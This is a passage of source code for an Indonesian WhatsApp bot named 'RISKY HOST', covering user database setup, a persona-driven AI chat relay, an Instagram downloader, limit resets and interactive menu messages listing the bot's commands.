ppuser = await RezzHost.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
}
ppnyauser = await getBuffer(ppuser)
try {
let isNumber = x => typeof x === 'number' && !isNaN(x)
let limitUser = isCreator ? 1000 : limitawal
let balanceUser = isCreator ? 10000 : balanceawal
let user = global.db.data.users[m.sender]
if (typeof user !== 'object') global.db.data.users[m.sender] = {}
if (user) {
if (!isNumber(user.balance)) user.balance = balanceUser
if (!isNumber(user.limit)) user.limit = limitUser
if (!('premium' in user)) user.premium = false
if (!isNumber(user.afkTime)) user.afkTime = -1
if (!('afkReason' in user)) user.afkReason = ''
if (!('claim' in user)) user.premium = 1
} else global.db.data.users[m.sender] = {
name: pushname,
limit: limitUser,
balance: balanceUser,
premium: false,
afkTime: -1,
afkReason: '',
limit: limitUser,
claim: 1,
}
} catch (err) {
console.log(err)
}

let isNumber = x => typeof x === 'number' && !isNaN(x)
let setting = global.db.data.settings[botNumber]
if (typeof setting !== 'object') global.db.data.settings[botNumber] = {}
if (setting) {
if (!isNumber(setting.status)) setting.status = 0
if (autobio) {
let _uptime = process.uptime() * 1000
let uptime = clockString(_uptime)
await RezzHost.updateProfileStatus(`I am RISKY HOST | Aktif Selama ${uptime} ⏳ | Mode : ${RezzHost.public ? 'Public-Mode' : 'Self-Mode'}`).catch(_ => _)
}
if (autoread) {
RezzHost.readMessages([m.key])
}
} else global.db.data.settings[botNumber] = {
status: 0,
autobio: false,
autoread: false
}
            
if(!('hadiah' in db.data.settings)) db.data.settings.hadiah = []
if(!('hadiahkadaluwarsa' in db.data.settings)) db.data.settings.hadiahkadaluwarsa = []
if(!('claimprem' in db.data.settings)) db.data.settings.claimprem = []
if(!('claimpremkadaluwarsa' in db.data.settings)) db.data.settings.claimpremkadaluwarsa = []            

if (m?.isGroup && chat) {
if (!('welcome' in chat)) chat.welcome = true
if (!('sWelcome' in chat)) chat.sWelcome = ''
if (!isNumber(chat.cleartime)) chat.clearTime = 0
} else if (m?.isGroup) global.db.data.chats[m.chat] = {
sWelcome: '',
welcome: true,
clearTime: 0
}

let chats = global.db.data.chats[m.chat]
if (typeof chats !== 'object') global.db.data.chats[m.chat] = {}
if (chats) {
if (!('mute' in chats)) chats.mute = false
if (!('RezzHost' in chats)) chats.RezzHost = false
} else global.db.data.chats[m.chat] = {
mute: false,
RezzHost: false
}

if (db.data.chats[m.chat].RezzHost) {
let name = await RezzHost.getName(m.sender)
  let prompt = `Mulai sekarang nama kamu adalah RISKY HOST, kamu mempunyai sifat yang ramah, lucu, dan suka membantu orang lain, kamu selalu menjawab semua pertanyaan yang di berikan menggunakan bahasa indonesia dan selalu menggunakan kata panggilan aku dan kamu!, kamu adalah ai buatan dari 𝗜𝗡𝗭𝗜𝗘 𝗢𝗙𝗖 yang di buat hanya untuk menjawab semua pertanyaan dengan ramah, dan lawan bicaramu sekarang adalah ${name}, dan kamu merespon pertanyaan di awali dengan kata sapaan sepeti halo di tambahkan dengan ${name}. dan ingat jangan bicara menggunakan kata formal anggap ${name} adalah teman mu.`
let RezzHostxdzz = await fetchJson(`https://itzpire.site/ai/gpt-logic?q=${budy.toLowerCase()}&logic=${prompt}&realtime=true`)
RezzHost.sendMessage(m.chat, {
text: `*[ I N Z I E ]*\n\n${RezzHost.data.response}`,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: botname,
body: '',
thumbnailUrl: `${thumbnail}`,
sourceUrl: "https://whatsapp.com/channel/0029Vajc7fkBA1erCyF48I3k",
mediaType: 1,
renderLargerThumbnail: true
}}
})
}

//================== [ ALL FUNCTION ] ==================//
let limitnya = db.data.users[m?.sender].limit
let balancenya = db.data.users[m?.sender].balance
const isPremium = db.data.users[m?.sender].premium == true ? true : m?.sender == owner ? true : false

async function uselimit() {
if (isCreator) return
db.data.users[m?.sender].limit -= 1
}

async function igdl2(url) {
let res = await axios("https://indown.io/");
let _$ = cheerio.load(res.data);
let referer = _$("input[name=referer]").val();
let locale = _$("input[name=locale]").val();
let _token = _$("input[name=_token]").val();
let { data } = await axios.post(
"https://indown.io/download",
new URLSearchParams({
link: url,
referer,
locale,
_token,
}),
{
headers: {
cookie: res.headers["set-cookie"].join("; "),
},
}
);
let $ = cheerio.load(data);
let result = [];
let __$ = cheerio.load($("#result").html());
__$("video").each(function () {
let $$ = $(this);
result.push({
type: "video",
thumbnail: $$.attr("poster"),
url: $$.find("source").attr("src"),
});
});
__$("img").each(function () {
let $$ = $(this);
result.push({
type: "image",
url: $$.attr("src"),
});
});

return result;
}

Array.prototype.rendem = function rendem() {
return this[Math.floor(Math.random() * this.length)];
}

function capital(string) {
  return string.charAt(0).toUpperCase() + string.slice(1);
}

function formatter(value) {
return value.toFixed(2).replace(/\B(?=(\d{3})+(?!\d))/g, ".");
}

function calculatePPN(value) {
return value * 0.1;
}

function removeItem(array, item) {
return array.filter(elem => !(elem.jid === item.jid && elem.state === item.state));
}

cron.schedule('00 00 * * *', () => {
let user = Object.keys(global.db.data.users)
for (let jid of user) {
global.db.data.users[jid].claim = 1
if (global.db.data.users[jid].balance < 10000 && global.db.data.users[jid].limit < 1) {
global.db.data.users[jid].limit = limitawal
global.db.data.users[jid].balance = balanceawal
}}}, {
scheduled: true,
timezone: "Asia/Makassar"
})

const totalFitur = () =>{
            var mytext = fs.readFileSync("./Rezz Case.js").toString()
            var numUpper = (mytext.match(/case '/g) || []).length;
            return numUpper
        }

let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
for (let jid of mentionUser) {
let user = global.db.data.users[jid]
if (!user) continue
let afkTime = user.afkTime
if (!afkTime || afkTime < 0) continue
let reason = user.afkReason || ''
reply(`
*[ USER AFK ! ]*
${pushname} AFK ${reason ? 'dengan alasan ' + reason : 'tanpa alasan'}
Selama ${clockString(new Date - afkTime)}
`.trim())
}
if (global.db.data.users[m.sender].afkTime > -1) {
let user = global.db.data.users[m.sender]
reply(`
Telah Kembali Dari Afk ${user.afkReason ? ' Selama ' + user.afkReason : ''}
Selama ${clockString(new Date - user.afkTime)}
`.trim())
user.afkTime = -1
user.afkReason = ''
}

async function dellCase(filePath, caseNameToRemove) {
    fs.readFile(filePath, 'utf8', (err, data) => {
        if (err) {
            console.error('Terjadi kesalahan:', err);
            return;
        }

        const regex = new RegExp(`case\\s+'${caseNameToRemove}':[\\s\\S]*?break`, 'g');
        const modifiedData = data.replace(regex, '');

        fs.writeFile(filePath, modifiedData, 'utf8', (err) => {
            if (err) {
                console.error('Terjadi kesalahan saat menulis file:', err);
                return;
            }

            console.log(`Teks dari case '${caseNameToRemove}' telah dihapus dari file.`);
        });
    });
}


const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
//=================================================//
switch(command) {
case "menu": {
await RezzHost.sendMessage(m.chat, { react: { text: "⏳",key: m.key,}})
await RezzHost.sendMessage(m.chat, { react: { text: "🕛",key: m.key,}})
await RezzHost.sendMessage(m.chat, { react: { text: "🕒",key: m.key,}})
await RezzHost.sendMessage(m.chat, { react: { text: "🕕",key: m.key,}})
await RezzHost.sendMessage(m.chat, { react: { text: "🕘",key: m.key,}})
await RezzHost.sendMessage(m.chat, { react: { text: "🕛",key: m.key,}})
await RezzHost.sendMessage(m.chat, { react: { text: "✅",key: m.key,}})
wek = `
╾─────╼[ BOT INFO ]╾─────╼
♙ *Bot Name :* RISKY HOST
☏ *Creator :* ${ownername}
♗ *Version :* ${versibot}
⚿ *Total Fitur :* ${totalFitur()}
♙ *Database Users* : ${Object.keys(db.data.users).length} Users
⌮ *Run Time* : ${runtime(process.uptime())}
╾─────╼[ USR INFO ]╾─────╼
♙ *Name :* ${pushname}
☏ *Number :* ${m?.sender.split('@')[0]}
╾────────────────────╼
`

let sections = [{
title: '<!>List Menu',
highlight_label: 'All Menu Lists',
rows: [{
title: '<!>Menu All',
description: `Displays All Menu`, 
id: '.allmenu'
},
{
title: '<!>List Panel',
description: `Displays Panel Menu`, 
id: '.panel-menu'
},
{
title: '<!>Menu Owner',
description: `Displays Owner Menu`, 
id: '.ownermenu'
},
{
title: '<!>Menu Main',
description: `Displays Main Menu`, 
id: '.mainmenu'
},
{
title: '<!>Menu Download',
description: `Displays Download Menu`, 
id: '.downloadmenu'
},
{
title: '<!>Menu Search',
description: `Displays Search Menu`, 
id: '.searchmenu'
},
{
title: '<!>Menu Group',
description: `Displays Group Menu`, 
id: '.groupmenu'
},
{
title: '<!>Menu Ai',
description: `Displays Ai Menu`, 
id: '.aimenu'
},
{
title: '<!>Menu Panel Peterodactly', 
description: "Displays the Panel Menu", 
id: '.panelmenu'
},
{
title: '<!>Menu Store', 
description: "Displays the Store", 
id: '.storemenu'
},
{
title: '<!>Menu Domain', 
description: "Displays the Domain Menu", 
id: '.domainmenu'
},
{
title: '<!>Menu Game', 
description: "Displays the Game Menu", 
id: '.gamemenu'
},
{
title: '<!>Menu Push Contacts', 
description: "Displays the Push Menu", 
id: '.pushmenu'
},
]
}]

let listMessage = {
    title: 'List Menu', 
    sections
};


let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
 mentionedJid: [m.sender], 
 isForwarded: true, 
 forwardedNewsletterMessageInfo: {
 newsletterJid: global.idsal,
 newsletterName: wm, 
 serverMessageId: -1
},
 businessMessageForwardInfo: { businessOwnerJid: RezzHost.decodeJid(RezzHost.user.id) },
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: wm
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: Styles('simple whatsapp bot made by RiskyOfc')
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: `*Hello, @${m.sender.replace(/@.+/g, '')}!*
╾─────╼[ BOT INFO ]╾─────╼
♙ *Bot Name :* RISKY HOST
☏ *Creator :* RISKY OFC 
♗ *Version :* ${versibot}
⚿ *Total Fitur :* ${totalFitur()}
♙ *Database Users* : ${Object.keys(db.data.users).length} Users
⌮ *Run Time* : ${runtime(process.uptime())}
╾─────╼[ USR INFO ]╾─────╼
♙ *Name :* ${pushname}
☏ *Number :* ${m?.sender.split('@')[0]}
♗ *Status* : ${isCreator ? "Owner" : "User"}
♙ *User* : ${isPremium ? 'Premium' : 'Free'}
⚿ *Limit :* ${limitnya}
⚿ *Balance :* $${toRupiah(balancenya)}
╾────────────────────╼`,
 subtitle: wm,
 hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: fs.readFileSync("./media/inzie.jpg"), gifPlayback: true }, { upload: RezzHost.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [ 
 {
"name": "single_select",
"buttonParamsJson": JSON.stringify(listMessage) 
},
 {
 "name": "cta_url",
 "buttonParamsJson": "{\"display_text\":\"👤 CREATOR\",\"url\":\"https://wa.me/6282173242194\",\"merchant_url\":\"https://wa.me/6282173242194\"}"
 },
 {
 "name": "cta_url",
 "buttonParamsJson": "{\"display_text\":\"👥 SALURAN\",\"url\":\"https://whatsapp.com/channel/0029Vajc7fkBA1erCyF48I3k\",\"merchant_url\":\"https://whatsapp.com/channel/0029Vajc7fkBA1erCyF48I3k\"}"
 },
 ],
 })
 })
 }
 }
}, {})

await RezzHost.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})}
break
case "allmenu": {
if (!isRegistered) return m.reply(mess.regis)
await RezzHost.sendMessage(m.chat, { react: { text: "⏳",key: m.key,}})
await RezzHost.sendMessage(m.chat, { react: { text: "🕛",key: m.key,}})
await RezzHost.sendMessage(m.chat, { react: { text: "🕒",key: m.key,}})
await RezzHost.sendMessage(m.chat, { react: { text: "🕕",key: m.key,}})
await RezzHost.sendMessage(m.chat, { react: { text: "🕘",key: m.key,}})
await RezzHost.sendMessage(m.chat, { react: { text: "🕛",key: m.key,}})
await RezzHost.sendMessage(m.chat, { react: { text: "✅",key: m.key,}})
var old = performance.now(); 
var neww = performance.now(); 
var speed = neww - old; 
let rezz = `
${ucapanWaktu}\n${pushname}
╾─────╼[ BOT INFO ]╾─────╼
♙ *Bot Name :* RISKY BOT
☏ *Creator :* RISKY OFC 
♗ *Version :* ${versibot}
⚿ *Total Fitur :* ${totalFitur()}
♙ *Database Users* : ${Object.keys(db.data.users).length} Users
⌮ *Run Time* : ${runtime(process.uptime())}
╾─────╼[ USR INFO ]╾─────╼
♙ *Name :* ${pushname}
☏ *Number :* ${m?.sender.split('@')[0]}
♗ *Status* : ${isCreator ? "Owner" : "User"}
♙ *User* : ${isPremium ? 'Premium' : 'Free'}
⚿ *Limit :* ${limitnya}
⚿ *Balance :* $${toRupiah(balancenya)}
╾────────────────────╼

${atas}
${garis} 乂 Owner Menu 乂
${tengah}
${garis} ${prefix}pay
${garis} ${prefix}setbotname
${garis} ${prefix}addprem
${garis} ${prefix}delprem
${garis} ${prefix}listprem
${garis} ${prefix}buatclaimprem
${garis} ${prefix}addbalance
${garis} ${prefix}addlimit
${garis} ${prefix}buathadiah
${garis} ${prefix}listclaimprem
${garis} ${prefix}listhadiah
${garis} ${prefix}public
${garis} ${prefix}self
${garis} ${prefix}getcase
${garis} ${prefix}addcase
${garis} ${prefix}delcase
${garis} ${prefix}listregis
${garis} ${prefix}getbio
${garis} ${prefix}setppbot
${garis} ${prefix}setpppanjang
${garis} ${prefix}delppbot
${garis} ${prefix}getname
${garis} ${prefix}sdomain
${garis} ${prefix}spanel
${garis} ${prefix}biochange
${garis} ${prefix}myip
${garis} ${prefix}restart
${garis} ${prefix}del
${tengah}
${garis} 乂 Main Menu 乂
${tengah}
${garis} ${prefix}claimprem
${garis} ${prefix}buyprem
${garis} ${prefix}afk
${garis} ${prefix}topglobal
${garis} ${prefix}buylimit
${garis} ${prefix}claim
${garis} ${prefix}redeemcode
${garis} ${prefix}qc
${garis} ${prefix}qc2
${garis} ${prefix}remini
${garis} ${prefix}me
${garis} ${prefix}totalfitur
${garis} ${prefix}tourl
${garis} ${prefix}sticker
${garis} ${prefix}pin
${garis} ${prefix}cekip
${garis} ${prefix}ssweb
${garis} ${prefix}toimg
${garis} ${prefix}jarak 
${garis} ${prefix}cerpen
${garis} ${prefix}asupan1-20
${tengah}
${garis} 乂 Download Menu 乂
${tengah}
${garis} ${prefix}tiktok
${garis} ${prefix}ytmp4
${garis} ${prefix}ytmp3
${garis} ${prefix}mediafire
${garis} ${prefix}instagram 
${garis} ${prefix}gitclone
${tengah}
${garis} 乂 Search menu 乂
${tengah}
${garis} ${prefix}google
${garis} ${prefix}yts
${garis} ${prefix}play
${garis} ${prefix}ttsearch
${tengah}
${garis} 乂 Group Menu 乂
${tengah}
${garis} ${prefix}add 
${garis} ${prefix}welcome
${garis} ${prefix}setname
${garis} ${prefix}linkgc
${garis} ${prefix}tagall
${garis} ${prefix}hidetag
${garis} ${prefix}promote
${garis} ${prefix}demote
${garis} ${prefix}kick 
${garis} ${prefix}closetime
${garis} ${prefix}opentime
${garis} ${prefix}antilink
${garis} ${prefix}editdesk
${garis} ${prefix}sendlinkgc
${garis} ${prefix}resetlinkgc
${garis} ${prefix}totag
${tengah}
${garis} 乂 Ai Menu 乂
${tengah}
${garis} ${prefix}RezzHost
${garis} ${prefix}RezzHostchat
${garis} ${prefix}bard
${tengah}
乂 Panel Menu 乂
${tengah}
${garis} ${prefix}addusr
${garis} ${prefix}addsrv
${garis} ${prefix}ramlist
${garis} ${prefix}delsrv
${garis} ${prefix}delusr
${garis} ${prefix}listpanel
${garis} ${prefix}addpanel
${garis} ${prefix}listadmin
${garis} ${prefix}addadmin
${garis} ${prefix}listsrv
${garis} ${prefix}listusr
${garis} ${prefix}delpanel
${tengah}
${garis} 乂 Store Menu 乂
${tengah}
${garis} ${prefix}done
${garis} ${prefix}listjualan
${garis} ${prefix}batal
${garis} ${prefix}tunda
${garis} ${prefix}reqpanel
${garis} ${prefix}payment
${tengah}
${garis} 乂 Push menu 乂
${tengah}
${garis} ${prefix}bcgc
${garis} ${prefix}jpm
${garis} ${prefix}jpmtesti
${garis} ${prefix}pushkontak
${garis} ${prefix}pushkontak1
${garis} ${prefix}listgc
${garis} ${prefix}startjpm
${garis} ${prefix}setteksjpm
${tengah}
${garis} 乂 Domain Menu 乂
${tengah}
${garis} ${prefix}addgc
${garis} ${prefix}delgc
${garis} ${prefix}subdomain
${tengah}
${garis} 乂 Game Menu 乂
${tengah} 
${garis} ${prefix}tebakbomb
${garis} ${prefix}casino
${garis} ${prefix}slot
${garis} ${prefix}tictactoe
${garis} ${prefix}delttt
${garis} ${prefix}suit
${garis} ${prefix}cekkhodam 
${bawah}

> Fitur Eror?
> Lapor Ke Owner
> .owner
`
let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
 mentionedJid: [m.sender], 
 isForwarded: true, 
 forwardedNewsletterMessageInfo: {
 newsletterJid: "https://chat.whatsapp.com/Cr7jt812wFs4NGkTbwegZu",
 newsletterName: "RISKY OFC", 
 serverMessageId: -1
},
 businessMessageForwardInfo: { businessOwnerJid: RezzHost.decodeJid(RezzHost.user.id) },
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: "RISKY OFC"
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: Styles('simple whatsapp bot made by risky bot')
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: rezz,
 subtitle: "RISKY OFC",
 hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: fs.readFileSync("./media/inzie.jpg"), gifPlayback: true }, { upload: RezzHost.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [ 
 {
 "name": "cta_url",
 "buttonParamsJson": "{\"display_text\":\"👤 CREATOR\",\"url\":\"https://wa.me/6282173242194\",\"merchant_url\":\"https://wa.me/6282173242194\"}"
 },
 {
 "name": "cta_url",
 "buttonParamsJson": "{\"display_text\":\"👥 SALURAN\",\"url\":\"https://chat.whatsapp.com/Cr7jt812wFs4NGkTbwegZu\",\"merchant_url\":\"https://chat.whatsapp.com/Cr7jt812wFs4NGkTbwegZu\"}"
 },
 ],
 })
 })
 }
 }
}, {})

await RezzHost.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})}
break
case "ownermenu": {
if (!isRegistered) return m.reply(mess.regis)
await RezzHost.sendMessage(m.chat, { react: { text: "⏳",key: m.key,}})
await RezzHost.sendMessage(m.chat, { react: { text: "🕛",key: m.key,}})
await RezzHost.sendMessage(m.chat, { react: { text: "🕒",key: m.key,}})
await RezzHost.sendMessage(m.chat, { react: { text: "🕕",key: m.key,}})
await RezzHost.sendMessage(m.chat, { react: { text: "🕘",key: m.key,}})
await RezzHost.sendMessage(m.chat, { react: { text: "🕛",key: m.key,}})
await RezzHost.sendMessage(m.chat, { react: { text: "✅",key: m.key,}})
var old = performance.now(); 
var neww = performance.now(); 
var speed = neww - old; 
let rezz = `
${ucapanWaktu}\n${pushname}

╾─────╼[ BOT INFO ]╾─────╼
♙ *Bot Name :* RISKY HOST
☏ *Creator :* RISKY OFC 
♗ *Version :* ${versibot}
⚿ *Total Fitur :* ${totalFitur()}
♙ *Database Users* : ${Object.keys(db.data.users).length} Users
⌮ *Run Time* : ${runtime(process.uptime())}
╾─────╼[ USR INFO ]╾─────╼
♙ *Name :* ${pushname}
☏ *Number :* ${m?.sender.split('@')[0]}
♗ *Status* : ${isCreator ? "Owner" : "User"}
♙ *User* : ${isPremium ? 'Premium' : 'Free'}
⚿ *Limit :* ${limitnya}
⚿ *Balance :* $${toRupiah(balancenya)}
╾────────────────────╼

${atas}
${garis} *[ OWNER MENU ]*
${tengah}
${garis} ${prefix}pay
${garis} ${prefix}setbotname
${garis} ${prefix}addprem
${garis} ${prefix}delprem
${garis} ${prefix}listprem
${garis} ${prefix}buatclaimprem
${garis} ${prefix}addbalance
${garis} ${prefix}addlimit
${garis} ${prefix}buathadiah
${garis} ${prefix}listclaimprem
${garis} ${prefix}listhadiah
${garis} ${prefix}public
${garis} ${prefix}self
${garis} ${prefix}getcase
${garis} ${prefix}addcase
${garis} ${prefix}delcase
${garis} ${prefix}listregis
${garis} ${prefix}getbio
${garis} ${prefix}setppbot
${garis} ${prefix}setpppanjang
${garis} ${prefix}delppbot
${garis} ${prefix}getname
${garis} ${prefix}sdomain
${garis} ${prefix}spanel
${garis} ${prefix}biochange
${garis} ${prefix}myip
${garis} ${prefix}restart
${garis} ${prefix}del
${bawah}
`
let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
 mentionedJid: [m.sender], 
 isForwarded: true, 
 forwardedNewsletterMessageInfo: {
 newsletterJid: "https://whatsapp.com/channel/0029Vajc7fkBA1erCyF48I3k",
 newsletterName: "RISKY OFC", 
 serverMessageId: -1
},
 businessMessageForwardInfo: { businessOwnerJid: RezzHost.decodeJid(RezzHost.user.id) },
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: "RISKY OFC"
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: Styles('simple whatsapp bot made by RiskyOfc')
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: rezz,
 subtitle: "Risky OFC",
 hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: fs.readFileSync("./media/inzie.jpg"), gifPlayback: true }, { upload: RezzHost.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [ 
 {
 "name": "cta_url",
 "buttonParamsJson": "{\"display_text\":\"👤 CREATOR\",\"url\":\"https://wa.me/6282173242194\",\"merchant_url\":\"https://wa.me/6282173242194\"}"
 },
 {
 "name": "cta_url",
 "buttonParamsJson": "{\"display_text\":\"👥 SALURAN\",\"url\":\"https://chat.whatsapp.com/Cr7jt812wFs4NGkTbwegZu\",\"merchant_url\":\"https://chat.whatsapp.com/Cr7jt812wFs4NGkTbwegZu\"}"
 },
 ],
 })
 })
 }
 }
}, {})

await RezzHost.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})}
break
case "mainmenu": {
if (!isRegistered) return m.reply(mess.regis)
await RezzHost.sendMessage(m.chat, { react: { text: "⏳",key: m.key,}})
await RezzHost.sendMessage(m.chat, { react: { text: "🕛",key: m.key,}})
await RezzHost.sendMessage(m.chat, { react: { text: "🕒",key: m.key,}})
await RezzHost.sendMessage(m.chat, { react: { text: "🕕",key: m.key,}})
await RezzHost.sendMessage(m.chat, { react: { text: "🕘",key: m.key,}})
await RezzHost.sendMessage(m.chat, { react: { text: "🕛",key: m.key,}})
await RezzHost.sendMessage(m.chat, { react: { text: "✅",key: m.key,}})
var old = performance.now(); 
var neww = performance.now(); 
var speed = neww - old; 
let rezz = `${ucapanWaktu}\n${pushname}

╾─────╼[ BOT INFO ]╾─────╼
♙ *Bot Name :* RISKY HOST
☏ *Creator :* RISKY OFC 
♗ *Version :* ${versibot}
⚿ *Total Fitur :* ${totalFitur()}
♙ *Database Users* : ${Object.keys(db.data.users).length} Users
⌮ *Run Time* : ${runtime(process.uptime())}
╾─────╼[ USR INFO ]╾─────╼
♙ *Name :* ${pushname}
☏ *Number :* ${m?.sender.split('@')[0]}
♗ *Status* : ${isCreator ? "Owner" : "User"}
♙ *User* : ${isPremium ? 'Premium' : 'Free'}
⚿ *Limit :* ${limitnya}
⚿ *Balance :* $${toRupiah(balancenya)}
╾────────────────────╼

${atas}
${garis} *[ MAIN MENU ]*
${tengah}
${garis} ${prefix}claimprem
${garis} ${prefix}buyprem
${garis} ${prefix}afk
${garis} ${prefix}topglobal
${garis} ${prefix}buylimit
${garis} ${prefix}claim
${garis} ${prefix}redeemcode
${garis} ${prefix}qc
${garis} ${prefix}qc2
${garis} ${prefix}remini
${garis} ${prefix}me
${garis} ${prefix}totalfitur
${garis} ${prefix}tourl
${garis} ${prefix}sticker
${garis} ${prefix}pin
${garis} ${prefix}cekip
${garis} ${prefix}ssweb
${garis} ${prefix}toimg
${garis} ${prefix}jarak 
${garis} ${prefix}cerpen
${garis} ${prefix}asupan1-20
${bawah}
`
let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
 mentionedJid: [m.sender], 
 isForwarded: true, 
 forwardedNewsletterMessageInfo: {
 newsletterJid: "https://whatsapp.com/channel/0029Vajc7fkBA1erCyF48I3k",
 newsletterName: "RISKY OFC", 
 serverMessageId: -1
},
 businessMessageForwardInfo: { businessOwnerJid: RezzHost.decodeJid(RezzHost.user.id) },
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: "RISKY OFC"
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: Styles('simple whatsapp bot made by InzieOfc')
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: rezz,
 subtitle: "RISKY OFC",
 hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: fs.readFileSync("./media/inzie.jpg"), gifPlayback: true }, { upload: RezzHost.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [ 
 {
 "name": "cta_url",
 "buttonParamsJson": "{\"display_text\":\"👤 CREATOR\",\"url\":\"https://wa.me/6282173242194\",\"merchant_url\":\"https://wa.me/6282173242194\"}"
 },
 {
 "name": "cta_url",
 "buttonParamsJson": "{\"display_text\":\"👥 SALURAN\",\"url\":\"https://whatsapp.com/channel/0029Vajc7fkBA1erCyF48I3k\",\"merchant_url\":\"https://whatsapp.com/channel/0029Vajc7fkBA1erCyF48I3k\"}"
 },
 ],
 })
 })
 }
 }
}, {})

await RezzHost.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})}
break
case "downloadmenu": {
if (!isRegistered) return m.reply(mess.regis)
await RezzHost.sendMessage(m.chat, { react: { text: "⏳",key: m.key,}})
await RezzHost.sendMessage(m.chat, { react: { text: "🕛",key: m.key,}})
await RezzHost.sendMessage(m.chat, { react: { text: "🕒",key: m.key,}})
await RezzHost.sendMessage(m.chat, { react: { text: "🕕",key: m.key,}})
await RezzHost.sendMessage(m.chat, { react: { text: "🕘",key: m.key,}})
await RezzHost.sendMessage(m.chat, { react: { text: "🕛",key: m.key,}})
await RezzHost.sendMessage(m.chat, { react: { text: "✅",key: m.key,}})
var old = performance.now(); 
var neww = performance.now(); 
var speed = neww - old; 
let rezz = `${ucapanWaktu}\n${pushname}

╾─────╼[ BOT INFO ]╾─────╼
♙ *Bot Name :* RISKY HOST
☏ *Creator :* RISKY OFC 
♗ *Version :* ${versibot}
⚿ *Total Fitur :* ${totalFitur()}
♙ *Database Users* : ${Object.keys(db.data.users).length} Users
⌮ *Run Time* : ${runtime(process.uptime())}
╾─────╼[ USR INFO ]╾─────╼
♙ *Name :* ${pushname}
☏ *Number :* ${m?.sender.split('@')[0]}
♗ *Status* : ${isCreator ? "Owner" : "User"}
♙ *User* : ${isPremium ? 'Premium' : 'Free'}
⚿ *Limit :* ${limitnya}
⚿ *Balance :* $${toRupiah(balancenya)}
╾────────────────────╼

${atas}
${garis} *[ DONLOAD MENU ]*
${tengah}
${garis} ${prefix}tiktok
${garis} ${prefix}ytmp4
${garis} ${prefix}ytmp3
${garis} ${prefix}mediafire
${garis} ${prefix}instagram 
${garis} ${prefix}gitclone
${bawah}
`
let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 "messageContextInfo": {
 "deviceListMetadata": {},
 "deviceListMetadataVersion": 2
 },
 interactiveMessage: proto.Message.InteractiveMessage.create({
 contextInfo: {
 mentionedJid: [m.sender], 
 isForwarded: true, 
 forwardedNewsletterMessageInfo: {
 newsletterJid: "https://whatsapp.com/channel/0029Vajc7fkBA1erCyF48I3k",
 newsletterName: "RISKY OFC", 
 serverMessageId: -1
},
 businessMessageForwardInfo: { businessOwnerJid: RezzHost.decodeJid(RezzHost.user.id) },
 }, 
 body: proto.Message.InteractiveMessage.Body.create({
 text: "RISKY OFC"
 }),
 footer: proto.Message.InteractiveMessage.Footer.create({
 text: Styles('simple whatsapp bot made by InzieOfc')
 }),
 header: proto.Message.InteractiveMessage.Header.create({
 title: rezz,
 subtitle: "RISKY OFC",
 hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: fs.readFileSync("./media/inzie.jpg"), gifPlayback: true }, { upload: RezzHost.waUploadToServer }))
 }),
 nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
 buttons: [ 
 {
 "name": "cta_url",
 "buttonParamsJson": "{\"display_text\":\"👤 CREATOR\",\"url\":\"https://wa.me/6282173242194\",\"merchant_url\":\"https://wa.me/6282173242194\"}"
 },
 {
 "name": "cta_url",
 "buttonParamsJson": "{\"display_text\":\"👥 SALURAN\",\"url\":\"https://whatsapp.com/channel/0029Vajc7fkBA1erCyF48I3k\",\"merchant_url\":\"https://whatsapp.com/channel/0029Vajc7fkBA1erCyF48I3k\"}"
 },
 ],
 })
 })
 }
 }
}, {})

await RezzHost.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})}
break
case "searchmenu": {
if (!isRegistered) return m.reply(mess.regis)
